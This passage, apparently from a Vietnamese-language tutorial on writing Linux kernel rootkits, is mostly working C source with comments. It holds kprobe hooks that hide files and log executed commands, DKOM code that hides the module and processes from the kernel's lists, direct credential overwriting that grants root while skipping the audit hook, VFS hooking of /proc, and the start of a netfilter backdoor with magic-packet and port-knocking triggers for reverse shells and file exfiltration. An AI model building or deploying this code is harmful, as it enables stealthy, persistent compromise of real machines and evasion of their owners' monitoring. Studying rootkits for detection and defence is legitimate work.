     * GFP_ATOMIC có thể fail nếu hết memory → check NULL. */
    if (!kern_buf)
        return 0;

    if (copy_from_user(kern_buf, data->dirent, ret)) {
        kfree(kern_buf);
        return 0;
    }

    /* Filtering logic — giống hooked_getdents64 trong Chapter 3.
     * Lặp lại ở đây cho completeness. */
    offset = 0;
    prev_entry = NULL;
    while (offset < ret) {
        current_entry = (void *)kern_buf + offset;

        /* Validate d_reclen — protect against corrupted entries.
         * d_reclen == 0 → offset không advance → infinite loop.
         * d_reclen > remaining → overread past buffer boundary. */
        if (current_entry->d_reclen == 0)
            break;
        if (current_entry->d_reclen > (ret - offset))
            break;

        bool hide = false;

        if (strncmp(current_entry->d_name, HIDDEN_PREFIX,
                    strlen(HIDDEN_PREFIX)) == 0)
            hide = true;

        if (hide) {
            if (current_entry == kern_buf) {
                ret -= current_entry->d_reclen;
                memmove(current_entry,
                        (char *)current_entry + current_entry->d_reclen,
                        ret);
                continue;
            }
            prev_entry->d_reclen += current_entry->d_reclen;
        } else {
            prev_entry = current_entry;
        }
        offset += current_entry->d_reclen;
    }

    copy_to_user(data->dirent, kern_buf, ret);
    kfree(kern_buf);

    /* MODIFY RETURN VALUE.
     * 
     * regs->ax = return value trên x86-64.
     * Set = filtered size. Nếu không modify, userspace thấy
     * original count nhưng buffer đã bị truncate → confusion. */
    regs->ax = ret;

    return 0;
}

static struct kretprobe getdents64_probe = {
    .handler         = getdents64_return,
    .entry_handler   = getdents64_entry,
    .data_size       = sizeof(struct getdents64_data),

    /* maxactive: maximum concurrent invocations.
     *
     * Nếu 20 processes đồng thời gọi getdents64,
     * probe xử lý 20 cái cùng lúc. Nếu >20, cái thừa bị miss.
     *
     * Chọn giá trị:
     *   - Quá nhỏ: miss hooks trên busy systems
     *   - Quá lớn: waste memory (mỗi instance = sizeof(data) bytes)
     *   - 20-50 thường đủ cho server workloads */
    .maxactive       = 20,

    .kp.symbol_name  = SYSCALL_PREFIX "getdents64",
};

/* ══════════════════════════════════════════════════════════════
 * KPROBE: Hook sys_execve — Log mọi process execution
 *
 * Pre-handler: chạy TRƯỚC instruction tại probe point.
 *
 * Use case: monitoring (log mọi exec) hoặc filtering
 * (block specific binaries).
 *
 * APT use case: log mọi command người dùng chạy → credential
 * harvesting, lateral movement intelligence.
 * ══════════════════════════════════════════════════════════════ */

static int execve_pre_handler(struct kprobe *p, struct pt_regs *regs)
{
    char __user *user_filename = (char __user *)regs->di;
    char filename[256];

    /* strncpy_from_user(): copy string từ userspace.
     * Return: số bytes copied, hoặc negative error.
     * An toàn hơn copy_from_user vì handle null-termination. */
    long len = strncpy_from_user(filename, user_filename,
                                  sizeof(filename) - 1);
    if (len > 0) {
        filename[len] = '\0';

        /* Log execution. Trong rootkit thật, gửi qua covert channel
         * thay vì printk (vì printk visible trong dmesg). */
        pr_info("rk: exec: %s by %s[%d] uid=%d\n",
                filename,
                current->comm,          /* Process name */
                current->pid,           /* PID */
                current_uid().val);     /* User ID */

        /* Advanced: filter execution.
         * Return non-zero từ pre_handler KHÔNG block execution.
         * Để block: phải modify regs (set return address, etc.)
         * Hoặc dùng kretprobe + modify return value = -EPERM. */
    }

    return 0;
}

static struct kprobe execve_kp = {
    .symbol_name = SYSCALL_PREFIX "execve",
    .pre_handler = execve_pre_handler,
};

/* ══════════════════════════════════════════════════════════════
 * KRETPROBE: Hook tcp_connect — Monitor/hide outbound connections
 *
 * Hook tcp_v4_connect() thay vì sys_connect() — sâu hơn,
 * bypass userland tools mà chỉ trace syscalls.
 *
 * tcp_v4_connect() là internal function handle TCP connection setup.
 * Hooked tại đây nghĩa là ta thấy connection TRƯỚC khi bất kỳ
 * userland monitoring tool nào.
 * ══════════════════════════════════════════════════════════════ */

struct tcp_connect_data {
    struct sock *sk;
};

static int tcp_connect_entry(struct kretprobe_instance *ri,
                              struct pt_regs *regs)
{
    struct tcp_connect_data *data =
        (struct tcp_connect_data *)ri->data;

    /* tcp_v4_connect(struct sock *sk, struct sockaddr *uaddr, int addr_len)
     * regs->di = struct sock * */
    data->sk = (struct sock *)regs->di;
    return 0;
}

static int tcp_connect_return(struct kretprobe_instance *ri,
                               struct pt_regs *regs)
{
    struct tcp_connect_data *data =
        (struct tcp_connect_data *)ri->data;
    struct sock *sk = data->sk;
    long retval = regs_return_value(regs);

    if (retval == 0 && sk) {
        /* Connection successful — log details */
        unsigned int daddr = sk->sk_daddr;     /* Destination IP */
        unsigned short dport = ntohs(sk->sk_dport); /* Dest port */
        unsigned short sport = sk->sk_num;      /* Source port */

        pr_info("rk: TCP connect %pI4:%u → %pI4:%u\n",
                &sk->sk_rcv_saddr, sport,    /* %pI4 = print IPv4 */
                &daddr, dport);
    }

    return 0;
}

static struct kretprobe tcp_connect_probe = {
    .handler       = tcp_connect_return,
    .entry_handler = tcp_connect_entry,
    .data_size     = sizeof(struct tcp_connect_data),
    .maxactive     = 50,
    .kp.symbol_name = "tcp_v4_connect",
};

/* ══════════════════════════════════════════════════════════════
 * LIFECYCLE
 * ══════════════════════════════════════════════════════════════ */

int rk_kprobe_install(void)
{
    int err;

    err = register_kretprobe(&getdents64_probe);
    if (err) {
        pr_err("rk: getdents64 kretprobe failed: %d\n", err);
        return err;
    }

    err = register_kprobe(&execve_kp);
    if (err) {
        pr_err("rk: execve kprobe failed: %d\n", err);
        unregister_kretprobe(&getdents64_probe);
        return err;
    }

    err = register_kretprobe(&tcp_connect_probe);
    if (err) {
        pr_err("rk: tcp_connect kretprobe failed: %d\n", err);
        unregister_kprobe(&execve_kp);
        unregister_kretprobe(&getdents64_probe);
        return err;
    }

    pr_info("rk: kprobe hooks installed\n");
    return 0;
}

void rk_kprobe_remove(void)
{
    unregister_kretprobe(&tcp_connect_probe);
    unregister_kprobe(&execve_kp);
    unregister_kretprobe(&getdents64_probe);

    /* Sau unregister, đợi in-flight handlers hoàn thành.
     * synchronize_rcu() đảm bảo mọi CPU đã exit handler. */
    synchronize_rcu();

    pr_info("rk: kprobe hooks removed\n");
}
```

---

---

# Part II — Advanced Kernel Techniques

## Chapter 6: DKOM — Direct Kernel Object Manipulation

```c
/* dkom.c — Direct Kernel Object Manipulation
 *
 * DKOM = Thay đổi kernel data structures trực tiếp, KHÔNG hook function.
 *
 * Tại sao DKOM đáng sợ:
 *   1. KHÔNG thay đổi code → code integrity checks PASS
 *   2. KHÔNG hook function → hook detection tools PASS
 *   3. Nhanh — chỉ modify vài pointers
 *   4. Khó detect ngoại trừ memory forensics
 *
 * Tại sao DKOM khó:
 *   1. Phải biết exact struct layout (thay đổi theo kernel version)
 *   2. Race conditions — cần proper locking
 *   3. Inconsistency detection — cross-view analysis sẽ phát hiện
 *   4. Potential crash nếu kernel iterate modified structures
 *
 * APT sử dụng: hầu hết kernel rootkits dùng DKOM ít nhất cho
 * module hiding (list_del). Advanced rootkits dùng DKOM cho
 * process hiding, credential manipulation.
 */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * MODULE HIDING via DKOM
 *
 * Kernel module list là doubly-linked list:
 *   module1 ↔ module2 ↔ rootkit ↔ module3
 *
 * Sau DKOM:
 *   module1 ↔ module2 ↔ module3
 *   rootkit (orphaned — không ai reference, nhưng code vẫn trong memory)
 *
 * Ẩn khỏi:
 *   - lsmod (đọc module list)
 *   - /proc/modules (đọc module list)
 *   - /sys/module/MODULE_NAME (kobject tree)
 *   - modinfo MODULE_NAME (cần module trong list)
 * ══════════════════════════════════════════════════════════════ */

/* Save pointers để có thể restore (show module lại cho rmmod) */
static struct list_head *saved_prev_module = NULL;
static bool module_is_hidden = false;

/*
 * Ẩn module hiện tại khỏi tất cả views.
 *
 * Phải ẩn từ 3 nơi:
 * 1. Module list (THIS_MODULE->list) — lsmod, /proc/modules
 * 2. Kobject tree (THIS_MODULE->mkobj.kobj) — /sys/module/
 * 3. Module section attributes — /sys/module/MODULE/sections/
 */
void rk_hide_module(void)
{
    if (module_is_hidden)
        return;

    /* Save previous node để restore sau.
     *
     * List structure:
     *   prev ↔ THIS_MODULE ↔ next
     *
     * saved_prev_module = prev → dùng khi cần re-insert.
     */
    saved_prev_module = THIS_MODULE->list.prev;

    /* 1. Xóa khỏi module list.
     *
     * list_del_init():
     *   - Unlink node khỏi doubly-linked list
     *     prev->next = next
     *     next->prev = prev
     *   - Init node: next = prev = &self (empty list)
     *
     * Tại sao list_del_init thay vì list_del:
     *   list_del set next/prev = LIST_POISON1/2 — debug values.
     *   Nếu ai check list structure → phát hiện poison values.
     *   list_del_init set next/prev = &self → looks like empty list.
     *
     * Sau dòng này:
     *   - lsmod KHÔNG thấy module
     *   - /proc/modules KHÔNG có entry
     *   - Nhưng module code VẪN trong memory, VẪN execute
     */
    list_del_init(&THIS_MODULE->list);

    /* 2. Xóa khỏi kobject tree (/sys/module/).
     *
     * kobject = kernel object representation cho sysfs.
     * Mỗi module có kobject tại /sys/module/MODULE_NAME/
     * chứa: parameters, sections, notes, etc.
     *
     * kobject_del() removes sysfs entry:
     *   - /sys/module/rk/ biến mất
     *   - ls /sys/module/ không liệt kê
     *
     * CẢNH BÁO: sau kobject_del, không thể dùng sysfs features.
     * Module parameters qua sysfs sẽ không accessible. */
    kobject_del(&THIS_MODULE->mkobj.kobj);

    /* 3. (Optional) Xóa khỏi /proc/modules text output.
     *
     * /proc/modules output generated từ module list iteration.
     * list_del ở trên đã handle điều này.
     * Nhưng nếu paranoid: hook seq_show của /proc/modules. */

    module_is_hidden = true;
    pr_info("rk: module hidden\n");
}

/*
 * Hiện module lại — cần trước khi rmmod.
 *
 * rmmod gọi find_module(name) → iterate module list → tìm module.
 * Nếu module không trong list → rmmod báo "module not found".
 *
 * Flow để unload:
 *   1. Trigger show (kill -54 31338)
 *   2. rmmod rk
 *   3. Module exit handler cleanup hooks
 */
void rk_show_module(void)
{
    if (!module_is_hidden || !saved_prev_module)
        return;

    /* Re-insert vào module list SAU node đã save.
     *
     * list_add(&THIS_MODULE->list, saved_prev_module):
     *   Insert THIS_MODULE after saved_prev_module.
     *   saved_prev → THIS_MODULE → (original next)
     *
     * Module giờ visible lại cho lsmod, /proc/modules. */
    list_add(&THIS_MODULE->list, saved_prev_module);

    /* Kobject KHÔNG restore — sysfs entry đã bị destroy.
     * Tạo lại kobject phức tạp và không cần thiết cho rmmod.
     * rmmod chỉ cần module trong list, không cần sysfs. */

    module_is_hidden = false;
    pr_info("rk: module shown\n");
}

/* ══════════════════════════════════════════════════════════════
 * PROCESS HIDING via DKOM
 *
 * Cách ps/top hoạt động:
 *   1. Mở /proc (procfs directory)
 *   2. getdents64 → list tất cả entries (bao gồm PID directories)
 *   3. Mỗi PID directory → read status, stat, cmdline, etc.
 *
 * Syscall table hook (Chapter 3) ẩn ở bước 2 (filter getdents64).
 * DKOM ẩn ở level sâu hơn: xóa process khỏi internal list.
 *
 * Linux process list:
 *   init_task.tasks ↔ task1.tasks ↔ task2.tasks ↔ ... ↔ init_task.tasks
 *   (Circular doubly-linked list, anchored at init_task)
 *
 * Xóa task khỏi list:
 *   - for_each_process() không thấy → /proc/PID không generated
 *   - ps, top, htop không thấy
 *   - kill PID vẫn work (kernel còn hash table riêng cho PID lookup)
 *   - Process VẪN chạy (scheduler dùng run queue, không phải task list)
 * ══════════════════════════════════════════════════════════════ */

/* Saved state cho process unhiding.
 *
 * Lưu task_struct pointer (pinned via get_task_struct) thay vì
 * saved_prev pointer, vì task trước đó có thể đã exit và
 * task_struct bị freed → dùng saved_prev sẽ UAF. */
struct hidden_proc {
    pid_t pid;
    struct task_struct *task;   /* Pinned reference via get_task_struct */
    struct hidden_proc *next;
};

static struct hidden_proc *hidden_proc_list = NULL;
static DEFINE_SPINLOCK(proc_hide_lock);

void rk_hide_process(pid_t pid)
{
    struct task_struct *task;
    struct hidden_proc *hp;
    rwlock_t *tasklist_lockp;

    /* Lookup tasklist_lock — unexported symbol, phải dùng
     * rk_lookup_name (kallsyms_lookup_name wrapper).
     *
     * tasklist_lock là rwlock bảo vệ task list.
     * Mọi code modify task list (fork, exit) acquire write lock.
     * Mọi code iterate task list (procfs, OOM) acquire read lock.
     * Ta phải acquire write lock để modify list safely. */
    tasklist_lockp = (rwlock_t *)rk_lookup_name("tasklist_lock");
    if (!tasklist_lockp) return;

    /* Tìm task_struct by PID.
     *
     * rcu_read_lock(): bắt đầu RCU read-side critical section.
     * Task structures được protect bởi RCU — đảm bảo task
     * không bị freed trong khi ta đang access.
     *
     * find_vpid(): tìm struct pid trong PID namespace.
     * pid_task(): convert struct pid → task_struct.
     * PIDTYPE_PID: tìm theo PID (không phải PGID hay SID). */
    rcu_read_lock();
    task = pid_task(find_vpid(pid), PIDTYPE_PID);

    if (!task) {
        rcu_read_unlock();
        pr_warn("rk: PID %d not found\n", pid);
        return;
    }

    /* Pin task_struct bằng get_task_struct.
     * Tăng reference count → task_struct không bị freed
     * ngay cả khi process exit. Ta cần giữ reference này
     * để re-insert task vào list khi show. */
    get_task_struct(task);
    rcu_read_unlock();

    /* Save state cho unhiding */
    hp = kzalloc(sizeof(*hp), GFP_KERNEL);
    if (!hp) {
        put_task_struct(task);
        return;
    }

    hp->pid = pid;
    hp->task = task;   /* Giữ pinned reference */

    /* Xóa khỏi task list với proper write locking.
     *
     * write_lock_irq(tasklist_lockp):
     *   1. Disable local interrupts (tránh deadlock với IRQ handlers)
     *   2. Acquire write lock (exclusive — block ALL readers AND writers)
     *
     * Tại sao write_lock thay vì rcu_read_lock:
     *   RCU read lock chỉ protect readers — KHÔNG protect writers.
     *   list_del_init modify list pointers — đây là WRITE operation.
     *   Concurrent for_each_process (OOM killer, procfs) dùng read lock
     *   sẽ thấy corrupt list nếu ta modify mà không hold write lock.
     *
     * CẢNH BÁO QUAN TRỌNG:
     *   list_del trên task->tasks CÓ THỂ gây issues:
     *   1. Một số kernel code iterate task list (OOM killer, procfs)
     *      → crash nếu gặp broken list
     *   2. Process accounting tool ghi log → miss hidden process
     *   3. waitpid() cho child processes có thể bị ảnh hưởng
     *
     *   Trong production rootkit (APT), thường dùng getdents64 hook
     *   thay vì DKOM cho process hiding — ít risky hơn.
     *   DKOM process hiding chủ yếu dùng cho research/demo. */
    write_lock_irq(tasklist_lockp);
    list_del_init(&task->tasks);
    write_unlock_irq(tasklist_lockp);

    /* Add vào hidden process list */
    spin_lock(&proc_hide_lock);
    hp->next = hidden_proc_list;
    hidden_proc_list = hp;
    spin_unlock(&proc_hide_lock);

    pr_info("rk: PID %d hidden via DKOM\n", pid);
}

void rk_show_process(pid_t pid)
{
    struct hidden_proc **pp, *hp;
    rwlock_t *tasklist_lockp;
    struct list_head *init_head;

    tasklist_lockp = (rwlock_t *)rk_lookup_name("tasklist_lock");
    if (!tasklist_lockp) return;

    /* Lấy init_task list head để re-insert.
     * Re-insert tại head of task list (after init_task).
     * Position không quan trọng cho correctness —
     * for_each_process dùng list iteration, không ordering. */
    init_head = &((struct task_struct *)rk_lookup_name("init_task"))->tasks;
    if (!init_head) return;

    spin_lock(&proc_hide_lock);
    for (pp = &hidden_proc_list; *pp; pp = &(*pp)->next) {
        if ((*pp)->pid == pid) {
            hp = *pp;
            *pp = hp->next;
            spin_unlock(&proc_hide_lock);

            /* Re-insert task vào list tại init_task head.
             *
             * Dùng write_lock_irq vì modify list structure.
             * list_add(&task->tasks, init_head) insert task
             * ngay SAU init_task trong circular list. */
            write_lock_irq(tasklist_lockp);
            list_add(&hp->task->tasks, init_head);
            write_unlock_irq(tasklist_lockp);

            /* Release pinned reference */
            put_task_struct(hp->task);
            kfree(hp);
            pr_info("rk: PID %d shown via DKOM\n", pid);
            return;
        }
    }
    spin_unlock(&proc_hide_lock);
}

/* ══════════════════════════════════════════════════════════════
 * CREDENTIAL MANIPULATION via DKOM
 *
 * Thay vì prepare_creds/commit_creds (API approach),
 * trực tiếp modify cred struct trong memory.
 *
 * TẠI SAO KHÔNG NÊN LÀM CÁCH NÀY:
 *   - cred struct là immutable by design (multiple readers via RCU)
 *   - Trực tiếp modify → race condition với code đang đọc cred
 *   - prepare_creds/commit_creds handle locking đúng cách
 *
 * TẠI SAO VẪN DEMO:
 *   - Hiểu sâu hơn về credential model
 *   - Một số rootkit thực tế dùng cách này
 *   - Bypasses audit logging (commit_creds có audit hook)
 * ══════════════════════════════════════════════════════════════ */

static void rk_dkom_give_root(struct task_struct *task)
{
    struct cred *cred;

    /* current->cred là const pointer — không thể modify trực tiếp.
     * Cast bỏ const = undefined behavior theo C standard.
     * Nhưng trong kernel context, ta có toàn quyền memory access. */
    cred = (struct cred *)task->cred;

    /* Trực tiếp overwrite credential fields.
     * KHÔNG qua prepare_creds/commit_creds:
     *   + Không tạo audit record (stealthier)
     *   + Không allocate memory (no failure case)
     *   - Potential race condition
     *   - Violates kernel credential model
     *   - Có thể corrupt state nếu concurrent reader */

    cred->uid.val = 0;
    cred->gid.val = 0;
    cred->euid.val = 0;
    cred->egid.val = 0;
    cred->suid.val = 0;
    cred->sgid.val = 0;
    cred->fsuid.val = 0;
    cred->fsgid.val = 0;

    cred->cap_effective = CAP_FULL_SET;
    cred->cap_permitted = CAP_FULL_SET;
    cred->cap_inheritable = CAP_FULL_SET;
    cred->cap_bset = CAP_FULL_SET;
    cred->cap_ambient = CAP_FULL_SET;
}
```

---

## Chapter 7: VFS Layer Hooking

```c
/* vfs_hook.c — VFS (Virtual File System) layer hooking
 *
 * Hook ở VFS layer = sâu hơn syscall table hook.
 *
 * Hierarchy:
 *   Syscall: sys_getdents64 → vfs_readdir → file->f_op->iterate_shared
 *   Hook tại f_op level bypass detection dựa trên syscall table check.
 *
 * VFS Architecture:
 *   Mỗi open file → struct file → f_op (file_operations)
 *   f_op chứa function pointers cho mọi operation trên file.
 *
 *   Cụ thể cho directories:
 *   f_op->iterate_shared() = read directory entries
 *   Hook iterate_shared → control output của readdir/getdents
 *
 * procfs (/proc) dùng VFS — mỗi /proc entry có riêng f_op.
 * Hook f_op của /proc root directory → control /proc listing
 * → ẩn process mà không cần hook syscall table.
 */

#include "rootkit.h"
#include <linux/version.h>

/* ══════════════════════════════════════════════════════════════
 * KERNEL VERSION COMPATIBILITY
 *
 * filldir_t return value thay đổi giữa kernel versions:
 *   Kernel < 6.1: filldir_t returns int
 *     0     = success, tiếp tục iterate
 *     non-0 = error, DỪNG iterate
 *
 *   Kernel >= 6.1: filldir_t returns bool
 *     true  = continue iteration
 *     false = stop iteration
 *
 * Nếu dùng sai return value:
 *   Trả true trên kernel < 6.1 = "error, stop" = TẤT CẢ entries
 *   sau entry hidden đầu tiên đều invisible.
 * ══════════════════════════════════════════════════════════════ */

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
  #define FILLDIR_SKIP   true    /* true = continue iteration */
  #define FILLDIR_EMIT   true
  typedef bool filldir_ret_t;
#else
  #define FILLDIR_SKIP   0       /* 0 = success/continue */
  #define FILLDIR_EMIT   0
  typedef int filldir_ret_t;
#endif

/* ══════════════════════════════════════════════════════════════
 * Hook iterate_shared trên /proc directory
 *
 * Khi ls /proc, kernel gọi:
 *   proc_root.f_op->iterate_shared(file, ctx)
 *
 * iterate_shared dùng callback pattern:
 *   Kernel iterate entries → cho mỗi entry gọi ctx->actor
 *   actor = filldir function (ghi entry vào user buffer)
 *
 * Hook strategy:
 *   1. Lấy original iterate_shared
 *   2. Replace bằng hooked version
 *   3. Hooked version tạo wrapper dir_context với custom filldir
 *   4. Custom filldir filter entries trước khi pass tới original filldir
 *
 * Thread safety:
 *   Không dùng global variable cho orig_proc_filldir vì
 *   2 CPUs concurrent gọi iterate_shared có thể race:
 *     CPU1: set orig = filldir_A
 *     CPU2: set orig = filldir_B
 *     CPU1: dùng orig (= filldir_B!) ← WRONG
 *   Giải pháp: dùng per-call storage trong wrapper struct.
 * ══════════════════════════════════════════════════════════════ */

static int (*orig_proc_iterate)(struct file *, struct dir_context *);

/*
 * Wrapper struct chứa per-call data.
 *
 * Embed custom dir_context (với actor = filter) VÀ pointer
 * tới ORIGINAL dir_context. Khi cần gọi original filldir,
 * pass original context (không phải wrapper) để tránh
 * container_of corruption.
 *
 * Layout:
 *   rk_filldir_data {
 *       dir_context ctx;       ← passed to orig iterate (actor = our filter)
 *       dir_context *orig_ctx; ← pointer to caller's ORIGINAL context
 *   }
 */
struct rk_filldir_data {
    struct dir_context  ctx;        /* Wrapper context (actor = our filter) */
    struct dir_context *orig_ctx;   /* Pointer tới ORIGINAL user context */
};

/*
 * Custom filldir — called cho mỗi entry trong /proc
 *
 * dir_context callback signature:
 *   filldir_ret_t filldir(struct dir_context *ctx, const char *name,
 *                         int namlen, loff_t offset, u64 ino,
 *                         unsigned int d_type)
 *
 * name    = entry name (e.g., "1234" for PID 1234, "cpuinfo", "meminfo")
 * namlen  = length of name
 * d_type  = DT_DIR, DT_REG, etc.
 *
 * Return FILLDIR_SKIP để skip entry (ẩn) mà vẫn tiếp tục iterate.
 */
static filldir_ret_t rk_proc_filldir(struct dir_context *ctx,
                                      const char *name, int namlen,
                                      loff_t offset, u64 ino,
                                      unsigned int d_type)
{
    /* Recover per-call data từ wrapper struct */
    struct rk_filldir_data *data =
        container_of(ctx, struct rk_filldir_data, ctx);

    /* Case 1: Ẩn PID directory */
    if (d_type == DT_DIR) {
        long pid_val;
        char pid_str[16];

        /* Copy name vì kstrtol cần null-terminated string.
         * name từ kernel đã null-terminated nhưng safe practice. */
        if (namlen < sizeof(pid_str)) {
            memcpy(pid_str, name, namlen);
            pid_str[namlen] = '\0';

            if (kstrtol(pid_str, 10, &pid_val) == 0) {
                /* name là numeric → PID directory.
                 * Check nếu PID cần ẩn. */
                if (is_pid_hidden((pid_t)pid_val))
                    return FILLDIR_SKIP;  /* Skip — PID ẩn, tiếp tục iterate */
            }
        }
    }

    /* Case 2: Ẩn file/directory có prefix */
    if (namlen >= strlen(HIDDEN_PREFIX) &&
        strncmp(name, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) == 0) {
        return FILLDIR_SKIP;  /* Skip entry, tiếp tục iterate */
    }

    /* Entry hợp lệ — gọi original filldir với ORIGINAL context.
     *
     * QUAN TRỌNG: pass data->orig_ctx (original context), KHÔNG phải
     * &data->ctx (wrapper). Original filldir có thể dùng container_of
     * trên context → nếu pass wrapper → tính toán offset sai →
     * memory corruption.
     *
     * orig_ctx->actor = original filldir callback từ VFS layer. */
    return data->orig_ctx->actor(data->orig_ctx, name, namlen,
                                  offset, ino, d_type);
}

/*
 * Hooked iterate_shared — tạo wrapper context per-call.
 *
 * Tạo rk_filldir_data trên stack (per-call, thread-safe).
 * Set actor = rk_proc_filldir, lưu pointer tới original context.
 * Pass wrapper tới orig_proc_iterate.
 */
static int hooked_proc_iterate(struct file *file,
                                struct dir_context *ctx)
{
    int ret;

    /* Wrap user's dir_context trong struct chứa per-call data */
    struct rk_filldir_data data = {
        .ctx.actor = rk_proc_filldir,
        .ctx.pos   = ctx->pos,
        .orig_ctx  = ctx,    /* Save pointer to original */
    };

    /* Gọi original iterate_shared với wrapped context.
     * Kernel sẽ iterate /proc entries → gọi rk_proc_filldir
     * cho mỗi entry → rk_proc_filldir filter → pass hoặc skip. */
    ret = orig_proc_iterate(file, &data.ctx);

    /* Sync position back to original context.
     * iterate_shared updates ctx->pos — ta cần propagate
     * change về original context. */
    ctx->pos = data.ctx.pos;

    return ret;
}

/* ══════════════════════════════════════════════════════════════
 * INSTALLATION
 *
 * Để hook iterate_shared, ta phải:
 * 1. Tìm file_operations struct của /proc root
 * 2. Save original iterate_shared pointer
 * 3. Replace bằng hooked version
 *
 * Thách thức: file_operations thường const (read-only).
 * Phải make writable trước khi modify.
 * ══════════════════════════════════════════════════════════════ */

static struct file_operations *proc_fops = NULL;

int rk_vfs_hook_install(void)
{
    struct file *proc_file;

    /* Mở /proc để lấy file_operations.
     *
     * filp_open(): kernel-internal open. Khác open() syscall:
     * - Không đi qua VFS name resolution chain
     * - Trực tiếp resolve path và return struct file *
     * - Chạy trong kernel context (không phải process context fd) */
    proc_file = filp_open("/proc", O_RDONLY, 0);
    if (IS_ERR(proc_file)) {
        pr_err("rk: cannot open /proc\n");
        return PTR_ERR(proc_file);
    }

    /* Lấy file_operations từ struct file.
     *
     * f_op = file operations table cho file/directory này.
     * Mọi file thuộc cùng filesystem type chia sẻ f_op.
     * → Modify f_op = affect TẤT CẢ files cùng type.
     * Cho /proc: proc_root_operations là shared. */
    proc_fops = (struct file_operations *)proc_file->f_op;

    /* Save original */
    orig_proc_iterate = proc_fops->iterate_shared;

    /* Make f_op writable.
     * file_operations struct thường trong read-only memory. */
    rk_unprotect_memory();

    /* Overwrite iterate_shared pointer */
    proc_fops->iterate_shared = hooked_proc_iterate;

    rk_protect_memory();

    filp_close(proc_file, NULL);

    pr_info("rk: VFS hook installed on /proc\n");
    return 0;
}

void rk_vfs_hook_remove(void)
{
    if (!proc_fops || !orig_proc_iterate)
        return;

    rk_unprotect_memory();
    proc_fops->iterate_shared = orig_proc_iterate;
    rk_protect_memory();

    pr_info("rk: VFS hook removed from /proc\n");
}
```

---

## Chapter 8: Network Rootkit — Netfilter & Covert Channel

```c
/* netfilter.c — Network hiding và covert communication
 *
 * Netfilter = Linux kernel framework xử lý packets tại các
 * hook points trong network stack.
 *
 * Hook points (NF_INET_*):
 *
 *   ┌──────────────────────────────────────────────────┐
 *   │               Network Stack                       │
 *   │                                                  │
 *   │  Incoming:                                       │
 *   │   NIC → PRE_ROUTING → [routing] → LOCAL_IN → App│
 *   │                          │                       │
 *   │                          └→ FORWARD → POST_ROUTING → NIC
 *   │                                                  │
 *   │  Outgoing:                                       │
 *   │   App → LOCAL_OUT → [routing] → POST_ROUTING → NIC│
 *   └──────────────────────────────────────────────────┘
 *
 *   PRE_ROUTING:  packet vừa arrive, trước routing decision
 *   LOCAL_IN:     packet destined cho local machine
 *   FORWARD:      packet được forward (router mode)
 *   LOCAL_OUT:    locally-generated packet
 *   POST_ROUTING: packet chuẩn bị leave
 *
 * Rootkit hook PRE_ROUTING hoặc LOCAL_IN để:
 *   1. Detect magic packets (trigger backdoor)
 *   2. Hide C2 traffic (NF_STOLEN — "ăn" packet)
 *   3. Port knocking (SYN sequence detection)
 *   4. Covert channel (data in ICMP, DNS, TCP options)
 */

#include "rootkit.h"
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/icmp.h>
#include <linux/inet.h>
#include <net/ip.h>
#include <net/tcp.h>

/* ══════════════════════════════════════════════════════════════
 * MAGIC PACKET TRIGGER
 *
 * Passive backdoor — rootkit KHÔNG beacon, đợi magic packet.
 * Pattern từ BPFDoor (APT):
 *   1. Attacker gửi specially crafted packet
 *   2. Rootkit detect magic bytes trong packet
 *   3. Rootkit activate — open reverse shell / execute command
 *
 * Packet KHÔNG đi tới application layer (NF_STOLEN) → invisible
 * cho netstat, tcpdump (nếu capture SAU netfilter hook).
 *
 * Magic packet format (custom):
 *   ICMP Echo Request với payload bắt đầu bằng magic bytes.
 *   ICMP vì: firewall thường cho qua ICMP, looks like ping.
 * ══════════════════════════════════════════════════════════════ */

#define MAGIC_VALUE    0xDEAD1337  /* 4 bytes magic identifier */
#define MAGIC_PASS     "s3cr3t"    /* Password trong payload */

/*
 * Magic packet payload structure:
 *   ┌───────────┬──────────────┬──────────────┬──────────────┐
 *   │ magic(4B) │ password(32B)│ cmd_type(1B) │ cmd_data(var)│
 *   └───────────┴──────────────┴──────────────┴──────────────┘
 *
 * cmd_type:
 *   0x01 = activate reverse shell (cmd_data = C2 IP:port)
 *   0x02 = execute command (cmd_data = command string)
 *   0x03 = exfiltrate file (cmd_data = filepath)
 *   0x04 = self-destruct (remove rootkit)
 */
struct magic_packet {
    u32  magic;
    char password[32];
    u8   cmd_type;
    char cmd_data[256];
} __attribute__((packed));

/* ══════════════════════════════════════════════════════════════
 * PORT KNOCKING
 *
 * Sequence detection: attacker gửi SYN packets tới ports
 * theo đúng thứ tự → rootkit activate.
 *
 * Ví dụ sequence: SYN→1234, SYN→5678, SYN→9012
 * Đúng thứ tự = unlock. Sai thứ tự = reset.
 *
 * Ưu điểm so với magic packet:
 *   - SYN packets giống port scan → ít suspicious
 *   - Không cần crafted payload
 *   - Firewall thấy dropped SYNs (closed ports) → normal
 * ══════════════════════════════════════════════════════════════ */

#define KNOCK_SEQUENCE_LEN 3
static const u16 knock_sequence[KNOCK_SEQUENCE_LEN] = {
    7000, 8000, 9000
};

struct knock_state {
    __be32 src_ip;           /* Source IP đang knock */
    int    current_step;     /* Step hiện tại trong sequence */
    unsigned long timestamp; /* Timeout tracking */
};

#define MAX_KNOCK_STATES 16
static struct knock_state knock_states[MAX_KNOCK_STATES];
static DEFINE_SPINLOCK(knock_lock);

static struct knock_state *find_knock_state(__be32 src_ip)
{
    int i;
    for (i = 0; i < MAX_KNOCK_STATES; i++) {
        if (knock_states[i].src_ip == src_ip)
            return &knock_states[i];
    }
    return NULL;
}

static struct knock_state *alloc_knock_state(__be32 src_ip)
{
    int i;

    /* Tìm slot trống hoặc expired */
    for (i = 0; i < MAX_KNOCK_STATES; i++) {
        if (knock_states[i].src_ip == 0 ||
            time_after(jiffies,
                       knock_states[i].timestamp + 30 * HZ)) {
            /* time_after(a, b): true nếu a sau b.
             * 30 * HZ = 30 seconds timeout.
             * HZ = ticks per second (thường 250 hoặc 1000). */
            knock_states[i].src_ip = src_ip;
            knock_states[i].current_step = 0;
            knock_states[i].timestamp = jiffies;
            return &knock_states[i];
        }
    }
    return NULL;
}

static bool check_port_knock(__be32 src_ip, u16 dest_port)
{
    struct knock_state *state;
    bool activated = false;

    spin_lock(&knock_lock);

    state = find_knock_state(src_ip);

    if (!state) {
        /* New knocker — check if first port matches */
